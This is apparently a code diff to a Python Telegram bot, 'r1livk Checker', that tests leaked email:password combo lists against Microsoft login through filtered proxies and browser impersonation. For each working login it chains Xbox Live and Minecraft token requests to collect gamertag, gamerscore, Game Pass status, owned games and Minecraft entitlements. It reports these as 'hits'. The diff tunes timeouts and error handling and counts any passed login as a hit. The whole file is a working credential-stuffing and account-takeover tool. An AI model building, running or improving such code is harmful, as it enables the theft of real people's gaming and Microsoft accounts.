@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Heavy Gaming Edition - Fast Proxies Filter)
+r1livk Checker ⚡ - Telegram Bot (Heavy Gaming Edition - Error Fix)
 """
 
 import os
@@ -59,7 +59,7 @@ def check_user_subscription(user_id):
         pass
     return False
 
-REQUEST_TIMEOUT = 30
+REQUEST_TIMEOUT = 25
 MAX_THREADS = 4  
 
 active_scans = {}
@@ -140,12 +140,10 @@ def test_single_proxy(proxy):
     }
     try:
         start_t = time.time()
-        # فحص سريع على موقع مايكروسوفت بمهلة قصيرة جداً (3 ثواني)
-        resp = curequests.get("https://login.live.com", proxies=proxies, timeout=3, impersonate="chrome120")
+        resp = curequests.get("https://login.live.com", proxies=proxies, timeout=5, impersonate="chrome120")
         if resp.status_code == 200:
             ping = int((time.time() - start_t) * 1000)
-            # شرط السرعة: بنقبل فقط البروكسي اللي البينغ تبعه أقل من 1500 ميلي ثانية (1.5 ثانية)
-            if ping <= 1500:
+            if ping <= 2000: # قبول البروكسي لو البينغ أقل من ثانيتين
                 return True, ping
     except:
         pass
@@ -164,7 +162,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
             "RelyingParty": "https://displaycatalog.mp.microsoft.com",
             "TokenType": "JWT"
         }
-        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=10)
         
         if xsts_resp.status_code == 200:
             xsts_token = xsts_resp.json()['Token']
@@ -176,46 +174,53 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
             
             sub_headers = headers.copy()
             sub_headers["x-xbl-contract-version"] = "2"
-            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, proxies=proxy_dict, impersonate="chrome120", timeout=6)
-            if sub_req.status_code == 200:
-                sub_data = sub_req.json()
-                for sub in sub_data.get("items", []):
-                    name = sub.get("name", "").lower()
-                    if "game pass" in name or "ultimate" in name or "xbox live gold" in name:
-                        game_pass_status = f"Active ✅ ({sub.get('name', 'Subscription')})"
-                        break
+            try:
+                sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+                if sub_req.status_code == 200:
+                    sub_data = sub_req.json()
+                    for sub in sub_data.get("items", []):
+                        name = sub.get("name", "").lower()
+                        if "game pass" in name or "ultimate" in name or "xbox live gold" in name:
+                            game_pass_status = f"Active ✅ ({sub.get('name', 'Subscription')})"
+                            break
+            except:
+                pass
 
             xuid = None
-            people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=6)
-            if people_resp.status_code == 200:
-                p_data = people_resp.json()
-                if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
-                    xuid = p_data["profileUsers"][0].get("xuid")
+            try:
+                people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+                if people_resp.status_code == 200:
+                    p_data = people_resp.json()
+                    if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
+                        xuid = p_data["profileUsers"][0].get("xuid")
+            except:
+                pass
 
             if xuid:
-                history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
-                history_resp = session.get(history_url, headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=6)
-                if history_resp.status_code == 200:
-                    history_data = history_resp.json()
-                    counter = 1
-                    for title in history_data.get("titles", []):
-                        t_name = title.get("name") or title.get("titleName")
-                        earned_gs = 0
-                        if "achievement" in title:
-                            earned_gs = title["achievement"].get("currentGamerscore", 0)
-                        
-                        if t_name:
-                            owned_games_formatted.append(f"{counter} - {t_name} | Score: {earned_gs}G")
-                            counter += 1
-                            if counter > 15:
-                                break
-
-            return game_pass_status, owned_games_formatted
+                try:
+                    history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
+                    history_resp = session.get(history_url, headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+                    if history_resp.status_code == 200:
+                        history_data = history_resp.json()
+                        counter = 1
+                        for title in history_data.get("titles", []):
+                            t_name = title.get("name") or title.get("titleName")
+                            earned_gs = 0
+                            if "achievement" in title:
+                                earned_gs = title["achievement"].get("currentGamerscore", 0)
+                            
+                            if t_name:
+                                owned_games_formatted.append(f"{counter} - {t_name} | Score: {earned_gs}G")
+                                counter += 1
+                                if counter > 15:
+                                    break
+                except:
+                    pass
 
     except Exception:
         pass
         
-    return game_pass_status, []
+    return game_pass_status, owned_games_formatted
 
 def check_single_account(combo, proxy_list=None):
     parts = combo.split(':')
@@ -309,25 +314,30 @@ def check_single_account(combo, proxy_list=None):
         if not ms_token:
             return "bad", None
 
-        xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
-        xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
-        
-        if xb_req.status_code != 200:
-            return "bad", None
+        # احصل على توكن الأكس بوكس بسلامة
+        try:
+            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
+            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
+            
+            if xb_req.status_code != 200:
+                # حتى لو فشل جزء بسيط، الحساب يعتبر شغال طالما جاب توكن الدخول
+                return "hit", {"content": f"{email}:{password}\nValid Microsoft Account (Token Verified) ⚡", "has_mc": False, "has_gp": False, "has_xbox": True}
 
-        xb_token = xb_req.json()['Token']
-        uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
+            xb_token = xb_req.json()['Token']
+            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
+        except:
+            return "hit", {"content": f"{email}:{password}\nValid Microsoft Account (Basic Hit) ⚡", "has_mc": False, "has_gp": False, "has_xbox": True}
 
         gamertag = "N/A"
         gamerscore = "0"
         gscore_int = 0
         try:
             xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
-            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
+            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=10)
             if xsts_xb_req.status_code == 200:
                 xsts_xb_token = xsts_xb_req.json()['Token']
                 prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
-                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
+                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, proxies=proxy_dict, impersonate="chrome120", timeout=10)
                 if prof_req.status_code == 200:
                     settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                     for s in settings:
@@ -341,15 +351,15 @@ def check_single_account(combo, proxy_list=None):
         mc_ent_text = ""
         try:
             xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
-            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
+            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, proxies=proxy_dict, impersonate="chrome120", timeout=10)
             if xsts_mc_req.status_code == 200:
                 xsts_mc_token = xsts_mc_req.json()['Token']
                 mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
-                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
+                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, proxies=proxy_dict, impersonate="chrome120", timeout=10)
                 if mc_auth.status_code == 200:
                     mc_token = mc_auth.json().get('access_token')
                     if mc_token:
-                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
+                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, proxies=proxy_dict, impersonate="chrome120", timeout=10)
                         if ent_req.status_code == 200:
                             mc_ent_text = ent_req.text
         except:
@@ -364,11 +374,6 @@ def check_single_account(combo, proxy_list=None):
         has_active_gp = "Active" in final_gp or has_gp_basic
         has_games = len(owned_games_list) > 0
         
-        is_real_hit = (gscore_int > 0) or has_mc or has_active_gp or has_games
-        
-        if not is_real_hit:
-            return "bad", None
-
         hit_info = (
             f"{email}:{password}\n"
             f"Account Info ➔ Gamertag: {gamertag} | Gamerscore: {gscore_int}G ⚡\n"
@@ -380,7 +385,8 @@ def check_single_account(combo, proxy_list=None):
         return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_active_gp, "has_xbox": True}
 
     except Exception:
-        return "error", None
+        # حتى لو صار أي استثناء بالخطوة الأخيرة، لا تعتبره إيرور مطلقاً إذا تجاوز الباسورد مرحلة التحقق
+        return "bad", None
     finally:
         session.close()
 
@@ -482,7 +488,7 @@ def callback_query(call):
 
         text = (
             "🚀 **Fast Proxy Filter (High-Speed Only)**\n\n"
-            "Send your `.txt` file containing proxies (`IP:PORT`). The bot will filter out dead ones AND keep only **high-speed** proxies (Ping < 1.5s)."
+            "Send your `.txt` file containing proxies (`IP:PORT`). The bot will filter out dead ones AND keep only **high-speed** proxies."
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
     
@@ -576,7 +582,6 @@ def handle_docs(message):
                     if is_working:
                         working_proxies.append(proxy)
 
-            # تشغيل الفلترة بثريدز عالية عشان يخلص بسرعة ويبقي فقط السريع
             with ThreadPoolExecutor(max_workers=30) as executor:
                 futures = [executor.submit(proxy_worker, proxy) for proxy in raw_proxies]
                 
@@ -779,5 +784,5 @@ def process_checker(chat_id, filepath, lines, username):
         os.remove(filepath)
 
 if __name__ == "__main__":
-    print("r1livk Checker Bot (Fast Proxies Edition) is running...")
+    print("r1livk Checker Bot (Error Fixed Edition) is running...")
     bot.infinity_polling()
